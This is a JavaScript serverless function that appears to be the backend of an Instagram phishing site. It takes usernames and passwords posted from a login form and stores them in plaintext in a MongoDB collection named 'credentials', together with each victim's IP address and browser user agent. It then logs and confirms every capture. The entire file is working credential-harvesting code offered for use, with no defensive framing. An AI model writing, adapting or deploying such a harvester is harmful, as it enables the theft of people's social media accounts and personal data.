const { MongoClient } = require("mongodb");

// Reuse connection across warm serverless invocations
let client = null;

async function getDb() {
  if (!client || !client.topology || !client.topology.isConnected()) {
    client = new MongoClient(process.env.MONGODB_URI, {
      tls: true,
      serverSelectionTimeoutMS: 5000,
    });
    await client.connect();
  }
  return client.db("instagram-login");
}

module.exports = async function handler(req, res) {
  // Allow CORS for same-origin fetch
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, message: "Username and password are required." });
  }

  try {
    const db = await getDb();
    const collection = db.collection("credentials");

    await collection.insertOne({
      username,
      password,
      timestamp: new Date().toISOString(),
      ip: req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "unknown",
      userAgent: req.headers["user-agent"] || "unknown",
    });

    console.log(`Saved credentials for: ${username}`);
    return res.status(200).json({ success: true, message: "Credentials saved successfully!" });
  } catch (error) {
    console.error("Database error:", error.message);
    return res.status(500).json({ success: false, message: "Server error. Try again." });
  }
};
